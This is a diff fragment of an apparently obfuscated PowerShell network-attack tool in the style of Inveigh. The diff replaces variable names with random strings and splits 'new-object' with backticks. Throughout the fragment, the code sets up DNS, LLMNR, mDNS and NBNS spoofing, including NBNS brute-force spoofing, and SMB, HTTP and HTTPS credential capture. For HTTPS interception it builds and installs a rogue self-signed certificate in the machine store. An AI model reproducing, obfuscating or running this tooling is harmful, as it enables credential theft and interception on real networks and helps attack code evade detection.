-        $LightOval.output_queue.Add("[+] DNS Spoofer = Enabled")  > $null
-        $LightOval.output_queue.Add("[+] DNS TTL = $HandsHop Seconds")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] DNS Spoofer = Enabled")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] DNS TTL = $uJYtaPKHBkqYNTkyQSeECcLBxVkiaeVYMOZmxVHhhl Seconds")  > $null
     }
     else
     {
-        $HomelyShow = "N"
-        $LightOval.output_queue.Add("[-] DNS Spoofer Disabled Due To In Use Port 53")  > $null
+        $tPEylzZKZOmcrNuZqaNvxfEfrUAkL = "N"
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] DNS Spoofer Disabled Due To In Use Port 53")  > $null
     }
 
 }
 else
 {
-    $LightOval.output_queue.Add("[+] DNS Spoofer = Disabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] DNS Spoofer = Disabled")  > $null
 }
 
-if($LipMeat -eq 'Y')
+if($PFkUZTrIToIoyXaKEeXORSPy -eq 'Y')
 {
 
-    if($DressGround -or !$YarnLate)
+    if($AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR -or !$WLbjpNavxbORRQlYAaINcPuFDsr)
     {
-        $LightOval.output_queue.Add("[+] LLMNR Spoofer = Enabled")  > $null
-        $LightOval.output_queue.Add("[+] LLMNR TTL = $TeaseNasty Seconds")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] LLMNR Spoofer = Enabled")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] LLMNR TTL = $UdYfMnaGXJWMXhxYZmYdzwcmAzjlyonIBluDRRRurFD Seconds")  > $null
     }
     else
     {
-        $LipMeat = "N"
-        $LightOval.output_queue.Add("[-] LLMNR Spoofer Disabled Due To In Use Port 5355")  > $null
+        $PFkUZTrIToIoyXaKEeXORSPy = "N"
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] LLMNR Spoofer Disabled Due To In Use Port 5355")  > $null
     }
 
 }
 else
 {
-    $LightOval.output_queue.Add("[+] LLMNR Spoofer = Disabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] LLMNR Spoofer = Disabled")  > $null
 }
 
-if($BoilClever -eq 'Y')
+if($QdOGoORVrhoEArPgHPqrqy -eq 'Y')
 {
 
-    if($DressGround -or !$ArtTested)
+    if($AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR -or !$KfptshEvZXNPSbilGnRcI)
     {
-        $GripWrong = $WantLittle -join ","
+        $bbXRenntUxmPweOjPnhJOOjzzInGdyhqU = $oiEknJevzfgMBjSqYIpc -join ","
 
-        if($WantLittle.Count -eq 1)
+        if($oiEknJevzfgMBjSqYIpc.Count -eq 1)
         {
-            $LightOval.output_queue.Add("[+] mDNS Spoofer For Type $GripWrong = Enabled")  > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] mDNS Spoofer For Type $bbXRenntUxmPweOjPnhJOOjzzInGdyhqU = Enabled")  > $null
         }
         else
         {
-            $LightOval.output_queue.Add("[+] mDNS Spoofer For Types $GripWrong = Enabled")  > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] mDNS Spoofer For Types $bbXRenntUxmPweOjPnhJOOjzzInGdyhqU = Enabled")  > $null
         }
 
-        $LightOval.output_queue.Add("[+] mDNS TTL = $MurderOffer Seconds")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] mDNS TTL = $LvtxlyiEnOfiOybKhfWwKTUJzJGquSXviBRRk Seconds")  > $null
     }
     else
     {
-        $BoilClever = "N"
-        $LightOval.output_queue.Add("[-] mDNS Spoofer Disabled Due To In Use Port 5353")  > $null
+        $QdOGoORVrhoEArPgHPqrqy = "N"
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] mDNS Spoofer Disabled Due To In Use Port 5353")  > $null
     }
 
 }
 else
 {
-    $LightOval.output_queue.Add("[+] mDNS Spoofer = Disabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] mDNS Spoofer = Disabled")  > $null
 }
 
-if($PeckFirst -eq 'Y')
+if($FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO -eq 'Y')
 {
-    $CreepyIcy = $ThawMiddle -join ","
+    $EABixWyQpNvhEgBvAWSmOELpskhsUVx = $XhwellVoTKeVMVnjDxSPEtBaYbtZbnzznVRtpfqiMxZZ -join ","
     
-    if($ThawMiddle.Count -eq 1)
+    if($XhwellVoTKeVMVnjDxSPEtBaYbtZbnzznVRtpfqiMxZZ.Count -eq 1)
     {
-        $LightOval.output_queue.Add("[+] NBNS Spoofer For Type $CreepyIcy = Enabled")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] NBNS Spoofer For Type $EABixWyQpNvhEgBvAWSmOELpskhsUVx = Enabled")  > $null
     }
     else
     {
-        $LightOval.output_queue.Add("[+] NBNS Spoofer For Types $CreepyIcy = Enabled")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] NBNS Spoofer For Types $EABixWyQpNvhEgBvAWSmOELpskhsUVx = Enabled")  > $null
     }
 
 }
 else
 {
-    $LightOval.output_queue.Add("[+] NBNS Spoofer = Disabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] NBNS Spoofer = Disabled")  > $null
 }
 
-if($SeaEarth -eq 'Y')
+if($POSxdOOZVTyYRayFSuOkyqkjOdwHvYEdfwrlikHIsVD -eq 'Y')
 {   
-    $LightOval.output_queue.Add("[+] NBNS Brute Force Spoofer Target = $NorthLumpy") > $null
-    $LightOval.output_queue.Add("[+] NBNS Brute Force Spoofer IP Address = $StickLame") > $null
-    $LightOval.output_queue.Add("[+] NBNS Brute Force Spoofer Hostname = $DelayValue") > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] NBNS Brute Force Spoofer Target = $deBQuAjyapQghIWyxSkbGMUVBhWkEQTObsvCP") > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] NBNS Brute Force Spoofer IP Address = $zkTvnUBoWamaHbrMDvklWqGBdwC") > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] NBNS Brute Force Spoofer Hostname = $WfbavDNzjNgDFDUYWZEYjga") > $null
 
-    if($MournMean)
+    if($NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu)
     {
-        $LightOval.output_queue.Add("[+] NBNS Brute Force Pause = $MournMean Seconds") > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] NBNS Brute Force Pause = $NRfqdntsPZobtiOhhrmgkqIltwHFxMIQcgwzNxjPu Seconds") > $null
     }
 
 }
 
-if($PeckFirst -eq 'Y' -or $SeaEarth -eq 'Y')
+if($FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO -eq 'Y' -or $POSxdOOZVTyYRayFSuOkyqkjOdwHvYEdfwrlikHIsVD -eq 'Y')
 {
-    $LightOval.output_queue.Add("[+] NBNS TTL = $BlushCattle Seconds") > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] NBNS TTL = $fgjekbNhYQKGsQdqOkUhuYvojUQK Seconds") > $null
 }
 
-if($PlugTour -eq 'Y' -and ($LipMeat -eq 'Y' -or $PeckFirst -eq 'Y'))
+if($LPmXJzyXqTgdUoElyxFCYzOJzqmSu -eq 'Y' -and ($PFkUZTrIToIoyXaKEeXORSPy -eq 'Y' -or $FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO -eq 'Y'))
 {
-    $LightOval.output_queue.Add("[+] Spoofer Learning = Enabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Spoofer Learning = Enabled")  > $null
 
-    if($SmokeFang -eq 1)
+    if($TUiftddccfYQxZeoLdwPKCLKmdiXZImsjJoICXnLErAY -eq 1)
     {
-        $LightOval.output_queue.Add("[+] Spoofer Learning Delay = $SmokeFang Minute")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Spoofer Learning Delay = $TUiftddccfYQxZeoLdwPKCLKmdiXZImsjJoICXnLErAY Minute")  > $null
     }
-    elseif($SmokeFang -gt 1)
+    elseif($TUiftddccfYQxZeoLdwPKCLKmdiXZImsjJoICXnLErAY -gt 1)
     {
-        $LightOval.output_queue.Add("[+] Spoofer Learning Delay = $SmokeFang Minutes")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Spoofer Learning Delay = $TUiftddccfYQxZeoLdwPKCLKmdiXZImsjJoICXnLErAY Minutes")  > $null
     }
     
-    if($WrongAnts -eq 1)
+    if($eEmdEINEKedVTvUFZHbuolOJMVn -eq 1)
     {
-        $LightOval.output_queue.Add("[+] Spoofer Learning Interval = $WrongAnts Minute")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Spoofer Learning Interval = $eEmdEINEKedVTvUFZHbuolOJMVn Minute")  > $null
     }
-    elseif($WrongAnts -eq 0)
+    elseif($eEmdEINEKedVTvUFZHbuolOJMVn -eq 0)
     {
-        $LightOval.output_queue.Add("[+] Spoofer Learning Interval = Disabled")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Spoofer Learning Interval = Disabled")  > $null
     }
-    elseif($WrongAnts -gt 1)
+    elseif($eEmdEINEKedVTvUFZHbuolOJMVn -gt 1)
     {
-        $LightOval.output_queue.Add("[+] Spoofer Learning Interval = $WrongAnts Minutes")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Spoofer Learning Interval = $eEmdEINEKedVTvUFZHbuolOJMVn Minutes")  > $null
     }
 
 }
 
-if($BikeLoud -and ($LipMeat -eq 'Y' -or $PeckFirst -eq 'Y'))
+if($EPlJedBuToZfupQVQRyNJcsGRdsiyc -and ($PFkUZTrIToIoyXaKEeXORSPy -eq 'Y' -or $FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO -eq 'Y'))
 {
-    $LightOval.output_queue.Add("[+] Spoofer Hosts Reply = " + ($BikeLoud -join ","))  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Spoofer Hosts Reply = " + ($EPlJedBuToZfupQVQRyNJcsGRdsiyc -join ","))  > $null
 }
 
-if($HoleRoute -and ($LipMeat -eq 'Y' -or $PeckFirst -eq 'Y'))
+if($fASVUOYmrApOtQBmKFuEovhUMlVuanUGYXvQMnoGTxjXo -and ($PFkUZTrIToIoyXaKEeXORSPy -eq 'Y' -or $FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO -eq 'Y'))
 {
-    $LightOval.output_queue.Add("[+] Spoofer Hosts Ignore = " + ($HoleRoute -join ","))  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Spoofer Hosts Ignore = " + ($fASVUOYmrApOtQBmKFuEovhUMlVuanUGYXvQMnoGTxjXo -join ","))  > $null
 }
 
-if($WoozyClose -and ($LipMeat -eq 'Y' -or $PeckFirst -eq 'Y'))
+if($swtccPhWthPrfRuqcBjGDBsGzLJxpUPliCqsEYyFZFe -and ($PFkUZTrIToIoyXaKEeXORSPy -eq 'Y' -or $FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO -eq 'Y'))
 {
-    $LightOval.output_queue.Add("[+] Spoofer IPs Reply = " + ($WoozyClose -join ","))  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Spoofer IPs Reply = " + ($swtccPhWthPrfRuqcBjGDBsGzLJxpUPliCqsEYyFZFe -join ","))  > $null
 }
 
-if($ObeyAttack -and ($LipMeat -eq 'Y' -or $PeckFirst -eq 'Y'))
+if($GeJSNuMkVuobUeQRhIVNdNxEwPrMoNg -and ($PFkUZTrIToIoyXaKEeXORSPy -eq 'Y' -or $FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO -eq 'Y'))
 {
-    $LightOval.output_queue.Add("[+] Spoofer IPs Ignore = " + ($ObeyAttack -join ","))  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Spoofer IPs Ignore = " + ($GeJSNuMkVuobUeQRhIVNdNxEwPrMoNg -join ","))  > $null
 }
 
-if($RelyNotice -eq 'N')
+if($lzXAGMLDOOrGvWxwWmxfIHRXsfHWfGmxgFVMLvbS -eq 'N')
 {
-    $LightOval.spoofer_repeat = $false
-    $LightOval.output_queue.Add("[+] Spoofer Repeating = Disabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.spoofer_repeat = $false
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Spoofer Repeating = Disabled")  > $null
 }
 else
 {
-    $LightOval.spoofer_repeat = $true
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.spoofer_repeat = $true
 }
 
-if($NorthAmuck -eq 'Y' -and $DressGround)
+if($UgjMonOdclnvuXTUStjJPlyfcIaSHwykwOJbBB -eq 'Y' -and $AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR)
 {
-    $LightOval.output_queue.Add("[+] SMB Capture = Enabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] SMB Capture = Enabled")  > $null
 }
 else
 {
-    $LightOval.output_queue.Add("[+] SMB Capture = Disabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] SMB Capture = Disabled")  > $null
 }
 
-if($ChargeClap -eq 'Y')
+if($XQYPwdDHgZKeoLOpHQUhQCuNLwfmtOFbrxtKDcERAyxo -eq 'Y')
 {
 
-    if($PoliteSquare)
+    if($ASzHrSwWLHAAvNypyORGCKCiwuqNqla)
     {
-        $ChargeClap = "N"
-        $LightOval.output_queue.Add("[-] HTTP Capture Disabled Due To In Use Port $LunchCheat")  > $null
+        $XQYPwdDHgZKeoLOpHQUhQCuNLwfmtOFbrxtKDcERAyxo = "N"
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] HTTP Capture Disabled Due To In Use Port $LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb")  > $null
     }
     else
     {
 
-        if($RightSnail -ne '0.0.0.0')
+        if($JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA -ne '0.0.0.0')
         {
-            $LightOval.output_queue.Add("[+] HTTP IP = $RightSnail") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTP IP = $JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA") > $null
         }
 
-        if($LunchCheat -ne 80)
+        if($LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb -ne 80)
         {
-            $LightOval.output_queue.Add("[+] HTTP Port = $LunchCheat") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTP Port = $LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb") > $null
         }
 
-        $LightOval.output_queue.Add("[+] HTTP Capture = Enabled")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTP Capture = Enabled")  > $null
     }
 
 }
 else
 {
-    $LightOval.output_queue.Add("[+] HTTP Capture = Disabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTP Capture = Disabled")  > $null
 }
 
-if($SourBottle -eq 'Y')
+if($zXuJKxMkcdZHqkkVbrPql -eq 'Y')
 {
 
-    if($DustyArm)
+    if($fjUiuJaAOsXyYHjApORCMpx)
     {
-        $SourBottle = "N"
-        $LightOval.HTTPS = $false
-        $LightOval.output_queue.Add("[-] HTTPS Capture Disabled Due To In Use Port $HarmFruit")  > $null
+        $zXuJKxMkcdZHqkkVbrPql = "N"
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTPS = $false
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] HTTPS Capture Disabled Due To In Use Port $ebIBhGGOpbSBFXWqVDkNgnIkDLxkcIi")  > $null
     }
     else
     {
 
         try
         { 
-            $LightOval.certificate_issuer = $PiesWound
-            $LightOval.certificate_CN = $FetchRobust
-            $LightOval.output_queue.Add("[+] HTTPS Certificate Issuer = " + $LightOval.certificate_issuer)  > $null
-            $LightOval.output_queue.Add("[+] HTTPS Certificate CN = " + $LightOval.certificate_CN)  > $null
-            $FoundCute = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $LightOval.certificate_issuer})
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.certificate_issuer = $EErIkmTcFOBpNMZRrqyGdNmGPVkzXmrWpR
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.certificate_CN = $TGOAomhHojpzXwSrFynUOBqOLMyHoxZJoSG
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTPS Certificate Issuer = " + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.certificate_issuer)  > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTPS Certificate CN = " + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.certificate_CN)  > $null
+            $oMLqMlOtmqhQuziUhihXapNBdYHNUJkCNTPMjOUweW = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.certificate_issuer})
 
-            if(!$FoundCute)
+            if(!$oMLqMlOtmqhQuziUhihXapNBdYHNUJkCNTPMjOUweW)
             {
                 # Microsoft".
-                $TrustStingy = ne`w-`obje`ct -com "X509Enrollment.CX500DistinguishedName"
-                $TrustStingy.Encode( "CN=" + $LightOval.certificate_CN, $TrustStingy.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
-                $ExistAmuse = ne`w-`obje`ct -com "X509Enrollment.CX500DistinguishedName"
-                $ExistAmuse.Encode("CN=" + $LightOval.certificate_issuer, $TrustStingy.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
-                $WetMinute = ne`w-`obje`ct -com "X509Enrollment.CX509PrivateKey"
-                $WetMinute.ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider"
-                $WetMinute.KeySpec = 2
-                $WetMinute.Length = 2048
-			    $WetMinute.MachineContext = 1
-                $WetMinute.Create()
-                $NoticeMean = ne`w-`obje`ct -com "X509Enrollment.CObjectId"
-			    $NoticeMean.InitializeFromValue("1.3.6.1.5.5.7.3.1")
-			    $PowerGrade = ne`w-`obje`ct -com "X509Enrollment.CObjectIds.1"
-			    $PowerGrade.Add($NoticeMean)
-			    $DanceShort = ne`w-`obje`ct -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
-			    $DanceShort.InitializeEncode($PowerGrade)
-			    $DollsRound = ne`w-`obje`ct -com "X509Enrollment.CX509CertificateRequestCertificate"
-			    $DollsRound.InitializeFromPrivateKey(2,$WetMinute,"")
-			    $DollsRound.Subject = $TrustStingy
-			    $DollsRound.Issuer = $ExistAmuse
-			    $DollsRound.NotBefore = (Get-Date).AddDays(-271)
-			    $DollsRound.NotAfter = $DollsRound.NotBefore.AddDays(824)
-			    $AmuckVersed = ne`w-`obje`ct -ComObject X509Enrollment.CObjectId
-			    $AmuckVersed.InitializeFromAlgorithmName(1,0,0,"SHA256")
-			    $DollsRound.HashAlgorithm = $AmuckVersed
-                $DollsRound.X509Extensions.Add($DanceShort)
-                $MomThrill = ne`w-`obje`ct -com "X509Enrollment.CX509ExtensionBasicConstraints"
-			    $MomThrill.InitializeEncode("true",1)
-                $DollsRound.X509Extensions.Add($MomThrill)
-                $DollsRound.Encode()
-                $SettleStale = ne`w-`obje`ct -com "X509Enrollment.CX509Enrollment"
-			    $SettleStale.InitializeFromRequest($DollsRound)
-			    $FryRoom = $SettleStale.CreateRequest(0)
-                $SettleStale.InstallResponse(2,$FryRoom,0,"")
-                $LightOval.certificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -match $LightOval.certificate_issuer})
+                $rxZCxnQaHkGojmQXxGWScrLVkEizDCbwmJCxRJG = ne`w`-`ob`je`ct -com "X509Enrollment.CX500DistinguishedName"
+                $rxZCxnQaHkGojmQXxGWScrLVkEizDCbwmJCxRJG.Encode( "CN=" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.certificate_CN, $rxZCxnQaHkGojmQXxGWScrLVkEizDCbwmJCxRJG.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
+                $hzlyXqeiNOqckocCwSnzUQvPRFgIjrKJFVSHNPyxRn = ne`w`-`ob`je`ct -com "X509Enrollment.CX500DistinguishedName"
+                $hzlyXqeiNOqckocCwSnzUQvPRFgIjrKJFVSHNPyxRn.Encode("CN=" + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.certificate_issuer, $rxZCxnQaHkGojmQXxGWScrLVkEizDCbwmJCxRJG.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
+                $XXVjYKkdEtgKfoQCOcBjBqPHAhJCYCT = ne`w`-`ob`je`ct -com "X509Enrollment.CX509PrivateKey"
+                $XXVjYKkdEtgKfoQCOcBjBqPHAhJCYCT.ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider"
+                $XXVjYKkdEtgKfoQCOcBjBqPHAhJCYCT.KeySpec = 2
+                $XXVjYKkdEtgKfoQCOcBjBqPHAhJCYCT.Length = 2048
+			    $XXVjYKkdEtgKfoQCOcBjBqPHAhJCYCT.MachineContext = 1
+                $XXVjYKkdEtgKfoQCOcBjBqPHAhJCYCT.Create()
+                $RembJLkJGWsLwfOfFVTIhYFOJOBNlkKfmYLfVUN = ne`w`-`ob`je`ct -com "X509Enrollment.CObjectId"
+			    $RembJLkJGWsLwfOfFVTIhYFOJOBNlkKfmYLfVUN.InitializeFromValue("1.3.6.1.5.5.7.3.1")
+			    $qEwYVVgpTigDiIsgNevHEIRPhgBleYuCBxnTCpItJkFd = ne`w`-`ob`je`ct -com "X509Enrollment.CObjectIds.1"
+			    $qEwYVVgpTigDiIsgNevHEIRPhgBleYuCBxnTCpItJkFd.Add($RembJLkJGWsLwfOfFVTIhYFOJOBNlkKfmYLfVUN)
+			    $VTmJxTktdawfvlfRdtyGpSnDTjpBC = ne`w`-`ob`je`ct -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
+			    $VTmJxTktdawfvlfRdtyGpSnDTjpBC.InitializeEncode($qEwYVVgpTigDiIsgNevHEIRPhgBleYuCBxnTCpItJkFd)
+			    $eNyoXCTAybaAANxTFwphvhJXcsiYBTuGp = ne`w`-`ob`je`ct -com "X509Enrollment.CX509CertificateRequestCertificate"
+			    $eNyoXCTAybaAANxTFwphvhJXcsiYBTuGp.InitializeFromPrivateKey(2,$XXVjYKkdEtgKfoQCOcBjBqPHAhJCYCT,"")
+			    $eNyoXCTAybaAANxTFwphvhJXcsiYBTuGp.Subject = $rxZCxnQaHkGojmQXxGWScrLVkEizDCbwmJCxRJG
+			    $eNyoXCTAybaAANxTFwphvhJXcsiYBTuGp.Issuer = $hzlyXqeiNOqckocCwSnzUQvPRFgIjrKJFVSHNPyxRn
+			    $eNyoXCTAybaAANxTFwphvhJXcsiYBTuGp.NotBefore = (Get-Date).AddDays(-271)
+			    $eNyoXCTAybaAANxTFwphvhJXcsiYBTuGp.NotAfter = $eNyoXCTAybaAANxTFwphvhJXcsiYBTuGp.NotBefore.AddDays(824)
+			    $mFPIPEtFsUZdqNCMrtfYURNuxqbzdFgjii = ne`w`-`ob`je`ct -ComObject X509Enrollment.CObjectId
+			    $mFPIPEtFsUZdqNCMrtfYURNuxqbzdFgjii.InitializeFromAlgorithmName(1,0,0,"SHA256")
+			    $eNyoXCTAybaAANxTFwphvhJXcsiYBTuGp.HashAlgorithm = $mFPIPEtFsUZdqNCMrtfYURNuxqbzdFgjii
+                $eNyoXCTAybaAANxTFwphvhJXcsiYBTuGp.X509Extensions.Add($VTmJxTktdawfvlfRdtyGpSnDTjpBC)
+                $areUvBLSCAseJaZfaCiB = ne`w`-`ob`je`ct -com "X509Enrollment.CX509ExtensionBasicConstraints"
+			    $areUvBLSCAseJaZfaCiB.InitializeEncode("true",1)
+                $eNyoXCTAybaAANxTFwphvhJXcsiYBTuGp.X509Extensions.Add($areUvBLSCAseJaZfaCiB)
+                $eNyoXCTAybaAANxTFwphvhJXcsiYBTuGp.Encode()
+                $pikpgIYxplCsMjjVPIQpot = ne`w`-`ob`je`ct -com "X509Enrollment.CX509Enrollment"
+			    $pikpgIYxplCsMjjVPIQpot.InitializeFromRequest($eNyoXCTAybaAANxTFwphvhJXcsiYBTuGp)
+			    $hxjDRGJNkqUxAcWkEGEE = $pikpgIYxplCsMjjVPIQpot.CreateRequest(0)
+                $pikpgIYxplCsMjjVPIQpot.InstallResponse(2,$hxjDRGJNkqUxAcWkEGEE,0,"")
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.certificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -match $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.certificate_issuer})
             }
             else
             {
                 
-                if($SomberBang -eq 'Y')
+                if($UXowvKKBiUoyaSPmKbFYELYqtZAjHUFvODVoHzqGDCPea -eq 'Y')
                 {
-                    $LightOval.HTTPS_force_certificate_delete = $true
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTPS_force_certificate_delete = $true
                 }
 
-                $LightOval.HTTPS_existing_certificate = $true
-                $LightOval.output_queue.Add("[+] HTTPS Capture = Using Existing Certificate")  > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTPS_existing_certificate = $true
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTPS Capture = Using Existing Certificate")  > $null
             }
             
-            $LightOval.HTTPS = $true
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTPS = $true
 
-            if($RightSnail -ne '0.0.0.0')
+            if($JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA -ne '0.0.0.0')
             { 
-                $LightOval.output_queue.Add("[+] HTTPS IP = $RightSnail") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTPS IP = $JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA") > $null
             }
 
-            if($HarmFruit -ne 443)
+            if($ebIBhGGOpbSBFXWqVDkNgnIkDLxkcIi -ne 443)
             {   
-                $LightOval.output_queue.Add("[+] HTTPS Port = $HarmFruit") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTPS Port = $ebIBhGGOpbSBFXWqVDkNgnIkDLxkcIi") > $null
             }
 
-            $LightOval.output_queue.Add("[+] HTTPS Capture = Enabled")  > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTPS Capture = Enabled")  > $null
 
         }
         catch
         {
-            $SourBottle = "N"
-            $LightOval.HTTPS = $false
-            $LightOval.output_queue.Add("[-] HTTPS Capture Disabled Due To Certificate Error")  > $null
+            $zXuJKxMkcdZHqkkVbrPql = "N"
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTPS = $false
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] HTTPS Capture Disabled Due To Certificate Error")  > $null
         }
 
     }
@@ -880,605 +880,605 @@ if($SourBottle -eq 'Y')
 }
 else
 {
-    $LightOval.output_queue.Add("[+] HTTPS Capture = Disabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTPS Capture = Disabled")  > $null
 }
 
-if($ChargeClap -eq 'Y' -or $SourBottle -eq 'Y')
+if($XQYPwdDHgZKeoLOpHQUhQCuNLwfmtOFbrxtKDcERAyxo -eq 'Y' -or $zXuJKxMkcdZHqkkVbrPql -eq 'Y')
 {
-    $LightOval.output_queue.Add("[+] HTTP/HTTPS Authentication = $SkirtStone")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] HTTP/HTTPS Authentication = $SKVFmrXEfBIfxjyvDecjFzVZvkyOhdiApBpgWeXKPiyP")  > $null
 
-    if($YummyShame -and !$YawnOdd)
